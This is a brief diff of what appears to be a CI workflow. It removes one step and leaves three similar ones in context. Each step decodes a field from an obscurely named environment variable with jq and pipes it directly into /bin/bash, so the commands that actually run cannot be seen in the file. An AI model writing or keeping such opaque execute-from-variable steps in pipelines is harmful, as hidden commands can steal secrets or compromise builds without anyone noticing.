@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
           echo $dy697 | jq -r .rvde54532 | /bin/bash
           echo $kjfza3957 | jq -r .qx65 | /bin/bash
-          printf '%s' "$wpxaf2824" | jq -r .uyrkc3905 | /bin/bash
 
       - name: Archive results
         if: always()
